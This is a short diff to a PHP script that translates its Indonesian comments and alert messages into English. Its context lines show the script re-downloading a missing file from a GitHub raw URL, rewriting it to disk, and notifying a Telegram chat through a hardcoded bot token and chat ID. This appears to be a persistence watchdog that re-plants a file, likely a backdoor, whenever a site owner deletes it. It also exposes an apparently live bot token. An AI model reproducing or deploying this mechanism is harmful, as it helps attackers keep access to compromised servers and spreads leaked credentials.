@@ -4,7 +4,7 @@ $backupURL = 'https://raw.githubusercontent.com/brianwijayacupu/Bangientau/refs/
 
 // Telegram config
 $telegramBotToken = '8349599623:AAHRR2SwOGvupKc6y6c0WVoyDxp-bwWSQhU';
-$telegramChatID = '1383301930'; // ← Ganti dengan angka Chat ID
+$telegramChatID = '1383301930';
 
 if (!file_exists($targetFile)) {
     $content = file_get_contents($backupURL);
@@ -12,10 +12,10 @@ if (!file_exists($targetFile)) {
         file_put_contents($targetFile, $content);
         chmod($targetFile, 0644);
         
-        // Kirim notifikasi ke Telegram
-        $message = "🚨 ALERT: File terhapus dan berhasil di-restore!\n\n";
+        // Send notification to Telegram
+        $message = "🚨 ALERT: File deleted and successfully restored!\n\n";
         $message .= "File: " . $targetFile . "\n";
-        $message .= "Waktu: " . date('Y-m-d H:i:s') . "\n";
+        $message .= "Time: " . date('Y-m-d H:i:s') . "\n";
         
         $telegramURL = "https://api.telegram.org/bot{$telegramBotToken}/sendMessage";
         $data = [
